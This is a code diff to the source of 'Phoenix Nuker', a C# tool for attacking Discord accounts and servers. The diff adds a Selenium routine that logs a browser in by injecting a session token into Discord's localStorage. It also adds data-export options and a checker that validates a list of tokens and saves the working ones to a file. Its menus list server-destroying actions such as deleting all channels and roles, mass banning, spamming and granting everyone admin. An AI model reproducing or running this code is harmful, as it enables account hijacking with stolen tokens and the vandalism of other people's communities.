@@ -3,6 +3,8 @@ using System.Drawing;
 using Console = Colorful.Console;
 using System.Diagnostics;
 using System.Reflection;
+using OpenQA.Selenium.Chrome;
+using OpenQA.Selenium;
 
 /* 
        │ Author       : extatent
@@ -226,12 +228,14 @@ namespace Phoenix
                 WriteLogo();
                 Console.Title = $"Phoenix Nuker | " + User.GetUsername(token);
 
-                string options = @"╔══════════════════════════════════════════════════╗
-║ [01] Account Nuker   [05] Report Bot             ║
-║ [02] Server Nuker    [06] Login To Other Account ║
-║ [03] Webhook Spammer [07] Go Back                ║
-║ [04] Delete Webhook  [08] Exit                   ║
-╚══════════════════════════════════════════════════╝
+                string options = @"
+╔═════════════════════════════════════════════════╗
+║ [01] Account Nuker   [06] Login To Account      ║
+║ [02] Server Nuker    [07] Export Data           ║
+║ [03] Webhook Spammer [08] Enter Another Account ║
+║ [04] Delete Webhook  [09] Go Back               ║
+║ [05] Report Bot      [10] Exit                  ║
+╚═════════════════════════════════════════════════╝
 
 ";
                 Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
@@ -337,19 +341,101 @@ namespace Phoenix
                         DoneMethod(Method.Options);
                         break;
                     case 6:
+                        WriteLogo();
+                        SeleniumLogin(token);
+                        DoneMethod(Method.Options);
+                        break;
+                    case 7:
+                        WriteLogo();
+                        string options3 = @"╔═════════════════════╗
+║ [01] Export Account ║
+║ [02] Export Server  ║
+╚═════════════════════╝
+
+";
+                        Console.WriteWithGradient(options3, Color.OrangeRed, Color.Yellow, 3);
+                        Console.ForegroundColor = Color.Yellow;
+                        Console.Write("Your choice: ");
+                        int choice = int.Parse(Console.ReadLine());
+                        if (choice == 1)
+                        {
+                            WriteLogo();
+                            User.ExportAccount(token);
+                        }
+                        else if (choice == 2)
+                        {
+                            WriteLogo();
+                            Console.Write("Guild ID: ");
+                            ulong? gid2 = ulong.Parse(Console.ReadLine());
+                            WriteLogo();
+                            Server.ExportServer(token, gid2);
+                        }
+                        DoneMethod(Method.Options);
+                        break;
+                    case 8:
                         if (File.Exists("config.json"))
                             File.Delete("config.json");
                         Process.Start(Assembly.GetExecutingAssembly().Location);
                         Environment.Exit(0);
                         break;
-                    case 7:
+                    case 9:
                         Console.Title = "Phoenix Nuker";
                         Login();
                         break;
-                    case 8:
+                    case 10:
                         Environment.Exit(0);
                         break;
                 }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+                Thread.Sleep(3000);
+                Options();
+            }
+        }
+        #endregion
+
+        #region Selenium Login
+        static void SeleniumLogin(string? token)
+        {
+            try
+            {
+                if (!File.Exists("chromedriver.exe"))
+                {
+                    Console.ForegroundColor = Color.Yellow;
+                    Console.WriteLine("Chromedriver is missing.\nChromedriver must be in the same folder as Phoenix.\nChromedriver must match your Chrome version.\nPress any key to download.");
+                    Console.ReadKey();
+                    Process.Start(new ProcessStartInfo("http://chromedriver.storage.googleapis.com/index.html") { UseShellExecute = true });
+                    Options();
+                }
+
+                Console.WriteLine("Please wait");
+
+                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
+                service.EnableVerboseLogging = false;
+                service.SuppressInitialDiagnosticInformation = true;
+                service.HideCommandPromptWindow = true;
+
+                ChromeOptions options = new ChromeOptions();
+                options.AddArgument("--disable-logging");
+                options.AddArguments("--mute-audio");
+                options.AddArguments("--disable-extensions");
+                options.AddArguments("--disable-notifications");
+                options.AddArguments("--disable-application-cache");
+                options.AddArguments("--no-sandbox");
+                options.AddArgument("--disable-crash-reporter");
+                options.AddArguments("--disable-dev-shm-usage");
+                options.AddArguments("--disable-gpu");
+                options.AddArgument("--ignore-certificate-errors");
+                options.AddArguments("--disable-infobars");
+                options.AddArgument("--silent");
+
+                IWebDriver driver = new ChromeDriver(service, options);
+                driver.Url = "https://discord.com/login";
+
+                IJavaScriptExecutor execute = (IJavaScriptExecutor)driver;
+                execute.ExecuteScript($"let token = \"{token}\"; function login(token) {{ setInterval(() => {{ document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${{token}}\"` }}, 50); setTimeout(() => {{ location.reload(); }}, 2500); }} login(token);");
             }
             catch (Exception e)
             {
@@ -367,10 +453,11 @@ namespace Phoenix
             {
                 WriteLogo();
                 string options = @"╔═════════════════════════════════════════════════════════════╗
-║ [01] Join Guild/Group [05] Add Reaction [09] Trigger Typing ║
-║ [02] Leave Guild      [06] Block User   [10] Report Message ║
-║ [03] Add Friend       [07] DM User      [11] Go Back        ║
-║ [04] Spam             [08] Leave Group  [12] Exit           ║
+║ [01] Join Guild/Group [06] Block User     [11] Check Tokens ║
+║ [02] Leave Guild      [07] DM User        [12] Go Back      ║
+║ [03] Add Friend       [08] Leave Group    [13] Exit         ║
+║ [04] Spam             [09] Trigger Typing                   ║
+║ [05] Add Reaction     [10] Report Message                   ║
 ╚═════════════════════════════════════════════════════════════╝
 
 ";
@@ -579,10 +666,26 @@ namespace Phoenix
                         DoneMethod(Method.Raider);
                         break;
                     case 11:
+                        WriteLogo();
+                        Console.ReplaceAllColorsWithDefaults();
+                        foreach (var token in clients)
+                        {
+                            try
+                            {
+                                Request.SendGet("/users/@me", token);
+                                Console.WriteLine(token, Color.Lime);
+                                File.AppendAllText("WorkingTokens.txt", token + Environment.NewLine);
+                            } catch { Console.WriteLine(token, Color.Red); }
+                        }
+                        Console.ForegroundColor = Color.Yellow;
+                        Console.WriteLine("Working tokens were saved to WorkingTokens.txt");
+                        DoneMethod(Method.Raider);
+                        break;
+                    case 12:
                         Console.Title = "Phoenix Nuker";
                         Start();
                         break;
-                    case 12:
+                    case 13:
                         Environment.Exit(0);
                         break;
                 }
@@ -756,27 +859,27 @@ namespace Phoenix
             try
             {
                 WriteLogo();
-                string options = @"╔══════════════════════════════════════════════════════════════════════════════════════════════╗
-║[01] Delete Roles         [09] Remove Integrations          [17] Mass Create Invites          ║
-║[02] Remove All Bans      [10] Remove All Reactions         [18] Delete Guild Scheduled Events║
-║[03] Delete All Channels  [11] Server Info                  [19] Delete Guild Template        ║
-║[04] Delete All Emojis    [12] Leave/Delete Server          [20] Delete Stage Instances       ║
-║[05] Delete All Invites   [13] Msg In Every Channel         [21] Delete Webhooks              ║
-║[06] Mass Create Roles    [14] Delete Stickers              [22] Switch To Other Server       ║
-║[07] Mass Create Channels [15] Grant Everyone Admin         [23] Go Back                      ║
-║[08] Prune Members        [16] Delete Auto Moderation Rules [24] Exit                         ║
-╚══════════════════════════════════════════════════════════════════════════════════════════════╝
+                string options = @"╔════════════════════════════════════════════════════════════════════════════════════════════════╗
+║ [01] Delete Roles         [09] Remove Integrations          [17] Mass Create Invites           ║
+║ [02] Remove All Bans      [10] Remove All Reactions         [18] Delete Guild Scheduled Events ║
+║ [03] Delete All Channels  [11] Server Info                  [19] Delete Guild Template         ║
+║ [04] Delete All Emojis    [12] Leave/Delete Server          [20] Delete Stage Instances        ║
+║ [05] Delete All Invites   [13] Msg In Every Channel         [21] Delete Webhooks               ║
+║ [06] Mass Create Roles    [14] Delete Stickers              [22] Switch To Other Server        ║
+║ [07] Mass Create Channels [15] Grant Everyone Admin         [23] Go Back                       ║
+║ [08] Prune Members        [16] Delete Auto Moderation Rules [24] Exit                          ║
+╚════════════════════════════════════════════════════════════════════════════════════════════════╝
 
 ";
                 Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
 
                 if (Config.IsBot == true)
                 {
-                    string options2 = @"╔═════════════════════╗
-║[25] Ban All Members ║
-║[26] Kick All Members║
-║[27] Rename Everyone ║
-╚═════════════════════╝
+                    string options2 = @"╔═══════════════════════╗
+║ [25] Ban All Members  ║
+║ [26] Kick All Members ║
+║ [27] Rename Everyone  ║
+╚═══════════════════════╝
 
 ";
                     Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 7);
